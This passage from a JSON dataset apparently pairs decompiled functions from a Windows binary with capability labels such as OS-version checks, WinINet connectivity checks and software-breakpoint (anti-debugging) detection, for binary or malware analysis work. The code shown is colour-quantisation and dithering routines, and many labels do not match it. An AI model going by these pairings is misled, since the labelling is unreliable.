fcn.0047c3a4;\n    }\n    else {\n        *(*in_EAX + 0x14) = 0x1b;\n        uVar3 = (***in_EAX)();\n    }\n    if (in_EAX[0x15] == 0) {\n        in_EAX[0x1f] = in_EAX[0x1e];\n        return uVar3;\n    }\n    in_EAX[0x1f] = 1;\n    return uVar3;\n}\n",
        "token_count": 1031
    },
    "0047c78c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0047c78c(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    bool bVar3;\n    int32_t *in_EAX;\n    int32_t iVar4;\n    int32_t *piVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t *piStack16;\n    \n    iVar1 = in_EAX[0x1e];\n    iVar2 = in_EAX[0x18];\n    iVar8 = 1;\n    do {\n        iVar6 = iVar8;\n        iVar8 = iVar6 + 1;\n        iVar7 = 1;\n        iVar4 = iVar8;\n        if (1 < iVar1) {\n            do {\n                iVar4 = iVar4 * iVar8;\n                iVar7 = iVar7 + 1;\n            } while (iVar7 < iVar1);\n        }\n    } while (iVar4 <= iVar2);\n    if (iVar6 < 2) {\n        iVar8 = *in_EAX;\n        *(iVar8 + 0x14) = 0x38;\n        *(iVar8 + 0x18) = iVar4;\n        (***in_EAX)();\n    }\n    iVar8 = 1;\n    iVar4 = 0;\n    piVar5 = param_2;\n    if (0 < iVar1) {\n        do {\n            *piVar5 = iVar6;\n            iVar8 = iVar8 * iVar6;\n            iVar4 = iVar4 + 1;\n            piVar5 = piVar5 + 1;\n        } while (iVar4 < iVar1);\n    }\n    do {\n        bVar3 = false;\n        iVar4 = 0;\n        piStack16 = 0x492190;\n        if (0 < iVar1) {\n            do {\n                iVar7 = iVar4;\n                if (in_EAX[0xb] == 2) {\n                    iVar7 = *piStack16;\n                }\n                iVar6 = (iVar8 / param_2[iVar7]) * (param_2[iVar7] + 1);\n                if (iVar6 - iVar2 != 0 && iVar2 <= iVar6) break;\n                iVar4 = iVar4 + 1;\n                param_2[iVar7] = param_2[iVar7] + 1;\n                bVar3 = true;\n                piStack16 = piStack16 + 1;\n                iVar8 = iVar6;\n            } while (iVar4 < iVar1);\n        }\n        if (!bVar3) {\n            return iVar8;\n        }\n    } while( true );\n}\n",
        "token_count": 577
    },
    "0047c8cc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid fcn.0047c8cc(void)\n\n{\n    int32_t iVar1;\n    uchar uVar2;\n    int32_t *in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uchar *puVar8;\n    int32_t iStack56;\n    int32_t iStack52;\n    int32_t iStack40;\n    int32_t *piStack36;\n    int32_t *piStack32;\n    \n    iVar7 = in_EAX[0x73];\n    uVar3 = fcn.0047c78c();\n    if (in_EAX[0x1e] == 3) {\n        iVar4 = *in_EAX;\n        *(iVar4 + 0x18) = uVar3;\n        *(iVar4 + 0x1c) = *(iVar7 + 0x20);\n        *(iVar4 + 0x20) = *(iVar7 + 0x24);\n        *(iVar4 + 0x24) = *(iVar7 + 0x28);\n        *(*in_EAX + 0x14) = 0x5e;\n        (**(*in_EAX + 4))();\n    }\n    else {\n        iVar7 = *in_EAX;\n        *(iVar7 + 0x14) = 0x5f;\n        *(iVar7 + 0x18) = uVar3;\n        (**(*in_EAX + 4))();\n    }\n    iVar7 = in_EAX[0x1e];\n    iVar4 = (**(in_EAX[1] + 8))();\n    iStack40 = iStack56;\n    piStack36 = in_EAX + 8;\n    for (iStack52 = 0; iStack52 < *(iVar7 + 0x78); iStack52 = iStack52 + 1) {\n        iVar1 = *piStack36;\n        iStack40 = iStack40 / iVar1;\n        if (0 < iVar1) {\n            do {\n                iVar7 = iVar1 + -1;\n                uVar2 = fcn.0047c884(iVar7);\n                piStack36 = piStack32;\n                for (iVar6 = iStack52 * iStack40; iVar6 < iVar4; iVar6 = iVar6 + iVar1) {\n                    iVar5 = 0;\n                    if (0 < iStack40) {\n                        do {\n                            puVar8 = *piStack32 + iVar6 + iVar5;\n                            iVar5 = iVar5 + 1;\n                            *puVar8 = uVar2;\n                        } while (iVar5 < iStack40);\n                    }\n                }\n                iStack52 = iStack52 + 1;\n            } while (iStack52 < 0);\n        }\n        piStack36 = piStack36 + 1;\n    }\n    in_EAX[4] = iVar4;\n    in_EAX[5] = iStack56;\n    return;\n}\n",
        "token_count": 656
    },
    "0047ca80": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0047ca80(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    int32_t in_EAX;\n    uint uVar4;\n    int32_t iVar5;\n    uchar *puVar6;\n    int32_t iVar7;\n    char cVar8;\n    int32_t iVar9;\n    int32_t iStack32;\n    int32_t iStack28;\n    int32_t *piStack24;\n    char *pcStack20;\n    \n    if (*(in_EAX + 0x58) == 1) {\n        *(*(in_EAX + 0x1cc) + 0x1c) = 1;\n    }\n    else {\n        *(*(in_EAX + 0x1cc) + 0x1c) = 0;\n    }\n    iVar2 = *(in_EAX + 0x78);\n    uVar4 = (**(*(in_EAX + 4) + 8))();\n    *(in_EAX + 0x18) = uVar4;\n    iStack32 = *(in_EAX + 0x14);\n    piStack24 = in_EAX + 0x20;\n    for (iVar9 = 0; iVar9 < *(iVar2 + 0x78); iVar9 = iVar9 + 1) {\n        iVar5 = *piStack24;\n        iStack32 = iStack32 / iVar5;\n        if (iStack28 != 0) {\n            piVar1 = *(in_EAX + 0x18) + iVar9 * 4;\n            *piVar1 = *piVar1 + 0xff;\n        }\n        cVar8 = '\\0';\n        puVar3 = *(*(in_EAX + 0x18) + iVar9 * 4);\n        iVar5 = fcn.0047c8a8(iVar5 + -1);\n        iVar7 = 0;\n        do {\n            while (iVar5 < iVar7) {\n                cVar8 = cVar8 + '\\x01';\n                iVar5 = fcn.0047c8a8(puVar3 + -1);\n            }\n            *pcStack20 = cVar8 * iStack32;\n            iVar7 = iVar7 + 1;\n            pcStack20 = pcStack20 + 1;\n        } while (iVar7 < 0x100);\n        if (iStack28 != 0) {\n            iVar5 = 1;\n            puVar6 = puVar3 + 0x100;\n            do {\n                iVar7 = -iVar5;\n                iVar5 = iVar5 + 1;\n                puVar3[iVar7] = *puVar3;\n                *puVar6 = puVar3[0xff];\n                puVar6 = puVar6 + 1;\n            } while (iVar5 < 0x100);\n        }\n        piStack24 = in_EAX + 4;\n    }\n    return;\n}\n",
        "token_count": 646
    },
    "0047ccf8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0047ccf8(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t in_EAX;\n    int32_t *piVar8;\n    char **in_ECX;\n    uint8_t *puVar9;\n    uint8_t **in_EDX;\n    int32_t iVar10;\n    char cVar11;\n    char **var_20h;\n    uint8_t **var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar2 = *(*(in_EAX + 0x1cc) + 0x18);\n    iVar3 = *(in_EAX + 0x70);\n    iVar4 = *(in_EAX + 0x78);\n    var_ch = 0;\n    var_20h = in_ECX;\n    var_1ch = in_EDX;\n    if (0 < arg_8h) {\n        do {\n            puVar9 = *var_1ch;\n            pcVar5 = *var_20h;\n            for (iVar7 = iVar3; iVar7 != 0; iVar7 = iVar7 + -1) {\n                cVar11 = '\\0';\n                iVar10 = 0;\n                piVar8 = piVar2;\n                if (0 < iVar4) {\n                    do {\n                        iVar6 = *piVar8;\n                        uVar1 = *puVar9;\n                        puVar9 = puVar9 + 1;\n                        piVar8 = piVar8 + 1;\n                        iVar10 = iVar10 + 1;\n                        cVar11 = cVar11 + *(iVar6 + uVar1);\n                    } while (iVar10 < iVar4);\n                }\n                *pcVar5 = cVar11;\n                pcVar5 = pcVar5 + 1;\n            }\n            var_ch = var_ch + 1;\n            var_20h = var_20h + 1;\n            var_1ch = var_1ch + 1;\n        } while (var_ch < arg_8h);\n    }\n    return;\n}\n",
        "token_count": 526
    },
    "0047cf40": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0047cf40(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint8_t uVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    int32_t iVar15;\n    int32_t in_EAX;\n    uint8_t *puVar16;\n    uint8_t *puVar17;\n    uint8_t *puVar18;\n    char **in_ECX;\n    uint8_t **in_EDX;\n    int32_t iVar19;\n    uint32_t uVar20;\n    char *pcVar21;\n    char **var_34h;\n    uint8_t **var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar5 = *(in_EAX + 0x1cc);\n    piVar6 = *(iVar5 + 0x18);\n    iVar7 = *piVar6;\n    iVar8 = piVar6[1];\n    iVar9 = piVar6[2];\n    iVar10 = *(in_EAX + 0x70);\n    var_24h = 0;\n    var_34h = in_ECX;\n    var_30h = in_EDX;\n    if (0 < arg_8h) {\n        do {\n            iVar11 = *(iVar5 + 0x30);\n            pcVar21 = *var_34h;\n            iVar12 = *(iVar5 + 0x34);\n            iVar19 = iVar11 * 0x40;\n            puVar18 = *var_30h;\n            iVar13 = *(iVar5 + 0x38);\n            iVar14 = *(iVar5 + 0x3c);\n            uVar20 = 0;\n            for (iVar15 = iVar10; iVar15 != 0; iVar15 = iVar15 + -1) {\n                uVar4 = *puVar18;\n                puVar16 = puVar18 + 1;\n                iVar1 = uVar20 * 4;\n                puVar17 = puVar18 + 2;\n                iVar2 = uVar20 * 4;\n                puVar18 = puVar18 + 3;\n                iVar3 = uVar20 * 4;\n                uVar20 = uVar20 + 1 & 0xf;\n                *pcVar21 = *(iVar7 + uVar4 + *(iVar12 + iVar19 + iVar1)) +\n                           *(iVar8 + *puVar16 + *(iVar13 + iVar19 + iVar2)) +\n                           *(iVar9 + *puVar17 + *(iVar14 + iVar19 + iVar3));\n                pcVar21 = pcVar21 + 1;\n            }\n            *(iVar5 + 0x30) = iVar11 + 1U & 0xf;\n            var_24h = var_24h + 1;\n            var_34h = var_34h + 1;\n            var_30h = var_30h + 1;\n        } while (var_24h < arg_8h);\n    }\n    return;\n}\n",
        "token_count": 791
    },
    "0047d058": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0047d058(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t in_EAX;\n    int32_t iVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    char **in_ECX;\n    int16_t *piVar12;\n    int32_t *in_EDX;\n    int32_t iVar13;\n    int32_t *var_50h;\n    int16_t **var_4ch;\n    uint var_48h;\n    uint var_44h;\n    char **var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    char *var_18h;\n    uint8_t *var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar2 = *(in_EAX + 0x1cc);\n    iVar3 = *(in_EAX + 0x78);\n    iVar4 = *(in_EAX + 0x70);\n    iVar5 = *(in_EAX + 0x144);\n    var_30h = 0;\n    var_50h = in_EDX;\n    var_40h = in_ECX;\n    if (0 < arg_8h) {\n        do {\n            fcn.00483830();\n            var_2ch = 0;\n            var_4ch = iVar2 + 0x44;\n            if (0 < iVar3) {\n                do {\n                    var_14h = *var_50h + var_2ch;\n                    var_18h = *var_40h;\n                    if (*(iVar2 + 0x54) == 0) {\n                        iVar13 = 1;\n                        piVar12 = *var_4ch;\n                        var_28h = iVar3;\n                    }\n                    else {\n                        iVar13 = -1;\n                        var_14h = var_14h + (iVar4 + -1) * iVar3;\n                        var_18h = var_18h + iVar4 + -1;\n                        piVar12 = *var_4ch + iVar4 + 1;\n                        var_28h = -iVar3;\n                    }\n                    iVar6 = *(*(iVar2 + 0x18) + var_2ch * 4);\n                    iVar7 = *(*(iVar2 + 0x10) + var_2ch * 4);\n                    iVar9 = 0;\n                    var_ch = 0;\n                    var_8h = 0;\n                    for (iVar8 = iVar4; iVar8 != 0; iVar8 = iVar8 + -1) {\n                        uVar10 = *(iVar5 + (iVar9 + piVar12[iVar13] + 8 >> 4) + *var_14h);\n                        uVar1 = *(iVar6 + uVar10);\n                        *var_18h = *var_18h + uVar1;\n                        iVar11 = uVar10 - *(iVar7 + uVar1);\n                        *piVar12 = var_ch + iVar11 * 3;\n                        var_ch = var_8h + iVar11 * 5;\n                        iVar9 = iVar11 * 7;\n                        var_14h = var_14h + var_28h;\n                        var_18h = var_18h + iVar13;\n                        piVar12 = piVar12 + iVar13;\n                        var_8h = iVar11;\n                    }\n                    *piVar12 = var_ch;\n                    var_2ch = var_2ch + 1;\n                    var_4ch = var_4ch + 1;\n                } while (var_2ch < iVar3);\n            }\n            *(iVar2 + 0x54) = *(iVar2 + 0x54) == 0;\n            var_30h = var_30h + 1;\n            var_50h = var_50h + 1;\n            var_40h = var_40h + 1;\n        } while (var_30h < arg_8h);\n    }\n    return;\n}\n",
        "token_count": 1007
    },
    "0047d340": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.0047d340(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    uint *puVar2;\n    \n    puVar2 = (**in_EAX[1])();\n    in_EAX[0x73] = puVar2;\n    *puVar2 = 0x47d254;\n    puVar2[2] = 0x47d32c;\n    puVar2[3] = 0x47d330;\n    puVar2[0x11] = 0;\n    puVar2[0xd] = 0;\n    if (4 < in_EAX[0x1e]) {\n        iVar1 = *in_EAX;\n        *(iVar1 + 0x14) = 0x37;\n        *(iVar1 + 0x18) = 4;\n        (***in_EAX)();\n    }\n    if (0x100 < in_EAX[0x18]) {\n        iVar1 = *in_EAX;\n        *(iVar1 + 0x14) = 0x39;\n        *(iVar1 + 0x18) = 0x100;\n        (***in_EAX)();\n    }\n    fcn.0047c8cc();\n    fcn.0047ca80();\n    if (in_EAX[0x16] == 2) {\n        fcn.0047d214();\n    }\n    return;\n}\n",
        "token_count": 311
    },
    "0047d458": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0047d458(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = 0;\n    iVar3 = 0;\n    iVar1 = 0;\n    if (0 < param_2) {\n        do {\n            if ((iVar2 < *(in_EAX + 0x1c)) && (0 < *(in_EAX + 0x18))) {\n                iVar2 = *(in_EAX + 0x1c);\n                iVar3 = in_EAX;\n            }\n            iVar1 = iVar1 + 1;\n            in_EAX = in_EAX + 0x20;\n        } while (iVar1 < param_2);\n    }\n    return iVar3;\n}\n",
        "token_count": 190
    },
    "0047d4ac": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047d4ac(uint param_1, int32_t *param_2)\n\n{\n    int32_t *piVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    int32_t in_EAX;\n    int32_t iVar4;\n    int32_t iVar5;\n    int16_t *piVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iStack76;\n    int32_t iStack72;\n    int32_t iStack68;\n    int32_t iStack64;\n    int32_t iStack60;\n    int32_t iStack56;\n    \n    iVar3 = *(*(in_EAX + 0x1cc) + 0x18);\n    iStack76 = *param_2;\n    iStack72 = param_2[1];\n    iStack68 = param_2[2];\n    iStack64 = param_2[3];\n    iStack60 = param_2[4];\n    iVar8 = param_2[5];\n    if (iStack76 < iStack72) {\n        piVar1 = iVar3 + iStack76 * 4;\n        for (iVar5 = iStack76; iVar7 = iStack68,  iVar5 <= iStack72; iVar5 = iVar5 + 1) {\n            for (; iVar7 <= iStack64; iVar7 = iVar7 + 1) {\n                piVar6 = *piVar1 + iVar7 * 0x40 + iStack60 * 2;\n                for (iVar4 = iStack60; iVar4 <= iVar8; iVar4 = iVar4 + 1) {\n                    iVar2 = *piVar6;\n                    piVar6 = piVar6 + 1;\n                    if (iVar2 != 0) {\n                        *param_2 = iVar5;\n                        iStack76 = iVar5;\n                        goto code_r0x0047d577;\n                    }\n                }\n            }\n            piVar1 = piVar1 + 1;\n        }\n    }\ncode_r0x0047d577:\n    if (iStack76 < iStack72) {\n        piVar1 = iVar3 + iStack72 * 4;\n        for (iVar5 = iStack72; iVar7 = iStack68,  iStack76 <= iVar5; iVar5 = iVar5 + -1) {\n            for (; iVar7 <= iStack64; iVar7 = iVar7 + 1) {\n                piVar6 = *piVar1 + iVar7 * 0x40 + iStack60 * 2;\n                for (iVar4 = iStack60; iVar4 <= iVar8; iVar4 = iVar4 + 1) {\n                    iVar2 = *piVar6;\n                    piVar6 = piVar6 + 1;\n                    if (iVar2 != 0) {\n                        param_2[1] = iVar5;\n                        iStack72 = iVar5;\n                        goto code_r0x0047d5f6;\n                    }\n                }\n            }\n            piVar1 = piVar1 + -1;\n        }\n    }\ncode_r0x0047d5f6:\n    iVar5 = iStack68;\n    if (iStack68 < iStack64) {\n        for (; iVar5 <= iStack64; iVar5 = iVar5 + 1) {\n            piVar1 = iVar3 + iStack76 * 4;\n            for (iVar7 = iStack76; iVar7 <= iStack72; iVar7 = iVar7 + 1) {\n                piVar6 = *piVar1 + iVar5 * 0x40 + iStack60 * 2;\n                for (iVar4 = iStack60; iVar4 <= iVar8; iVar4 = iVar4 + 1) {\n                    iVar2 = *piVar6;\n                    piVar6 = piVar6 + 1;\n                    if (iVar2 != 0) {\n                        param_2[2] = iVar5;\n                        iStack68 = iVar5;\n                        goto code_r0x0047d66b;\n                    }\n                }\n                piVar1 = piVar1 + 1;\n            }\n        }\n    }\ncode_r0x0047d66b:\n    iVar5 = iStack64;\n    if (iStack68 < iStack64) {\n        for (; iStack68 <= iVar5; iVar5 = iVar5 + -1) {\n            piVar1 = iVar3 + iStack76 * 4;\n            for (iVar7 = iStack76; iVar7 <= iStack72; iVar7 = iVar7 + 1) {\n                piVar6 = *piVar1 + iVar5 * 0x40 + iStack60 * 2;\n                for (iVar4 = iStack60; iVar4 <= iVar8; iVar4 = iVar4 + 1) {\n                    iVar2 = *piVar6;\n                    piVar6 = piVar6 + 1;\n                    if (iVar2 != 0) {\n                        param_2[3] = iVar5;\n                        iStack64 = iVar5;\n                        goto code_r0x0047d6e0;\n                    }\n                }\n                piVar1 = piVar1 + 1;\n            }\n        }\n    }\ncode_r0x0047d6e0:\n    iVar5 = iStack60;\n    if (iStack60 < iVar8) {\n        for (; iVar5 <= iVar8; iVar5 = iVar5 + 1) {\n            piVar1 = iVar3 + iStack76 * 4;\n            for (iVar7 = iStack76; iVar7 <= iStack72; iVar7 = iVar7 + 1) {\n                piVar6 = *piVar1 + iStack68 * 0x40 + iVar5 * 2;\n                for (iVar4 = iStack68; iVar4 <= iStack64; iVar4 = iVar4 + 1) {\n                    if (*piVar6 != 0) {\n                        param_2[4] = iVar5;\n                        iStack60 = iVar5;\n                        goto code_r0x0047d74f;\n                    }\n                    piVar6 = piVar6 + 0x20;\n                }\n                piVar1 = piVar1 + 1;\n            }\n        }\n    }\ncode_r0x0047d74f:\n    iVar5 = iVar8;\n    if (iStack60 < iVar8) {\n        for (; iStack60 <= iVar5; iVar5 = iVar5 + -1) {\n            piVar1 = iVar3 + iStack76 * 4;\n            for (iVar7 = iStack76; iVar7 <= iStack72; iVar7 = iVar7 + 1) {\n                piVar6 = *piVar1 + iStack68 * 0x40 + iVar5 * 2;\n                for (iVar4 = iStack68; iVar4 <= iStack64; iVar4 = iVar4 + 1) {\n                    if (*piVar6 != 0) {\n                        param_2[5] = iVar5;\n                        iVar8 = iVar5;\n                        goto code_r0x0047d7be;\n                    }\n                    piVar6 = piVar6 + 0x20;\n                }\n                piVar1 = piVar1 + 1;\n            }\n        }\n    }\ncode_r0x0047d7be:\n    iVar4 = (iStack72 - iStack76) * 8;\n    iVar5 = (iVar8 - iStack60) * 0x10;\n    iVar7 = (iStack64 - iStack68) * 0xc;\n    param_2[6] = iVar4 * iVar4 + iVar7 * iVar7 + iVar5 * iVar5;\n    iStack56 = 0;\n    piVar1 = iVar3 + iStack76 * 4;\n    for (; iVar3 = iStack68,  iStack76 <= iStack72; iStack76 = iStack76 + 1) {\n        for (; iVar3 <= iStack64; iVar3 = iVar3 + 1) {\n            piVar6 = *piVar1 + iVar3 * 0x40 + iStack60 * 2;\n            for (iVar5 = iStack60; iVar5 <= iVar8; iVar5 = iVar5 + 1) {\n                if (*piVar6 != 0) {\n                    iStack56 = iStack56 + 1;\n                }\n                piVar6 = piVar6 + 1;\n            }\n        }\n        piVar1 = piVar1 + 1;\n    }\n    param_2[7] = iStack56;\n    return;\n}\n",
        "token_count": 1851
    },
    "0047ddb4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0047ddb4(uchar *arg_8h, uint8_t *arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t in_EDX;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_23ch;\n    uint8_t *var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    uchar *var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_18h = 0x7f;\n    puVar2 = &var_23ch;\n    var_ch = in_ECX;\n    var_8h = in_EDX;\n    var_4h = in_EAX;\n    do {\n        *puVar2 = 0x7fffffff;\n        puVar2 = puVar2 + 1;\n        var_18h = var_18h + -1;\n    } while (-1 < var_18h);\n    var_18h = 0;\n    var_3ch = arg_ch;\n    if (0 < arg_10h) {\n        do {\n            var_1ch = *var_3ch;\n            piVar4 = *(var_4h + 0x88);\n            iVar1 = var_8h - *(*piVar4 + var_1ch);\n            iVar6 = var_ch - *(piVar4[1] + var_1ch);\n            iVar5 = iVar6 * 3;\n            iVar3 = arg_14h - *(piVar4[2] + var_1ch);\n            iVar7 = iVar3 * 2;\n            var_24h = iVar1 * iVar1 + iVar5 * iVar5 + iVar7 * iVar7;\n            var_34h = iVar6 * 0x48 + 0x90;\n            var_38h = iVar3 * 0x40 + 0x100;\n            piVar4 = &var_23ch;\n            var_20h = arg_8h;\n            var_2ch = iVar1 * 0x10 + 0x40;\n            var_10h = 3;\n            do {\n                var_28h = var_24h;\n                var_30h = var_34h;\n                var_14h = 7;\n                do {\n                    iVar1 = 3;\n                    iVar5 = var_38h;\n                    iVar7 = var_28h;\n                    do {\n                        if (iVar7 < *piVar4) {\n                            *piVar4 = iVar7;\n                            *var_20h = var_1ch;\n                        }\n                        iVar7 = iVar7 + iVar5;\n                        iVar5 = iVar5 + 0x200;\n                        piVar4 = piVar4 + 1;\n                        var_20h = var_20h + 1;\n                        iVar1 = iVar1 + -1;\n                    } while (-1 < iVar1);\n                    var_28h = var_28h + var_30h;\n                    var_30h = var_30h + 0x120;\n                    var_14h = var_14h + -1;\n                } while (-1 < var_14h);\n                var_24h = var_24h + var_2ch;\n                var_2ch = var_2ch + 0x80;\n                var_10h = var_10h + -1;\n            } while (-1 < var_10h);\n            var_18h = var_18h + 1;\n            var_3ch = var_3ch + 1;\n        } while (var_18h < arg_10h);\n    }\n    return;\n}\n",
        "token_count": 954
    },
    "0047e00c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0047e00c(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    int32_t in_EAX;\n    char **in_ECX;\n    uint8_t **in_EDX;\n    uint8_t *puVar6;\n    uint8_t *puVar7;\n    uint8_t *puVar8;\n    int16_t *piVar9;\n    char **var_24h;\n    uint8_t **var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = *(*(in_EAX + 0x1cc) + 0x18);\n    iVar3 = *(in_EAX + 0x70);\n    var_14h = 0;\n    var_24h = in_ECX;\n    var_20h = in_EDX;\n    if (0 < arg_8h) {\n        do {\n            puVar8 = *var_20h;\n            pcVar4 = *var_24h;\n            for (iVar5 = iVar3; iVar5 != 0; iVar5 = iVar5 + -1) {\n                uVar1 = *puVar8;\n                puVar6 = puVar8 + 1;\n                puVar7 = puVar8 + 2;\n                puVar8 = puVar8 + 3;\n                piVar9 = *(iVar2 + (uVar1 >> 3) * 4) + (*puVar6 >> 2) * 0x40 + (*puVar7 >> 3) * 2;\n                if (*piVar9 == 0) {\n                    fcn.0047df2c(*puVar7 >> 3);\n                }\n                *pcVar4 = *piVar9 + -1;\n                pcVar4 = pcVar4 + 1;\n            }\n            var_14h = var_14h + 1;\n            var_24h = var_24h + 1;\n            var_20h = var_20h + 1;\n        } while (var_14h < arg_8h);\n    }\n    return;\n}\n",
        "token_count": 525
    },
    "0047e0d8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
